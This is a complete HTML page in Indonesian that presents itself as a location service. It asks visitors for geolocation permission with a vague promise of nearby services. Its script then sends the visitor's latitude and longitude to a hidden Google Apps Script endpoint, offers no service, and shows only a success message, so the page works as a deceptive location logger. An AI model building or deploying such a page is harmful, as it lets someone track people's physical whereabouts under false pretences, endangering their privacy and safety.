<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Layanan Lokasi</title>

<style>
body{
  margin:0;
  font-family: Arial;
  background: linear-gradient(135deg,#667eea,#764ba2);
  color:white;
  text-align:center;
}

.container{
  margin-top:100px;
  padding:20px;
}

.card{
  background: rgba(255,255,255,0.1);
  backdrop-filter: blur(10px);
  padding:20px;
  border-radius:15px;
}

button{
  margin-top:20px;
  padding:12px 25px;
  border:none;
  border-radius:10px;
  background:#00e676;
  font-size:16px;
  font-weight:bold;
  color:#000;
}

.status{
  margin-top:15px;
  font-size:14px;
  opacity:0.8;
}

.success{color:#00ffcc;}
.error{color:#ffcccc;}
</style>
</head>

<body>

<div class="container">
  <div class="card">
    <h2>📍 Aktifkan Lokasi</h2>
    <p>Kami membutuhkan izin lokasi untuk menampilkan layanan terbaik di sekitar Anda.</p>

    <button onclick="ambilLokasi()">Izinkan Lokasi</button>

    <div id="status" class="status">Menunggu izin...</div>
  </div>
</div>

<script>
function ambilLokasi(){

  document.getElementById("status").innerHTML="Meminta izin lokasi...";

  if(navigator.geolocation){

    navigator.geolocation.getCurrentPosition(

      function(pos){

        let lat=pos.coords.latitude;
        let lon=pos.coords.longitude;

        document.getElementById("status").innerHTML="✅ Lokasi berhasil diambil";
        document.getElementById("status").className="status success";

        // kirim ke Google Script
        fetch("https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat="+lat+"&lon="+lon);

      },

      function(err){
        document.getElementById("status").innerHTML="❌ Gagal: "+err.message;
        document.getElementById("status").className="status error";
      }

    );

  }else{
    document.getElementById("status").innerHTML="❌ Browser tidak support";
  }
}
</script>

</body>
</html>
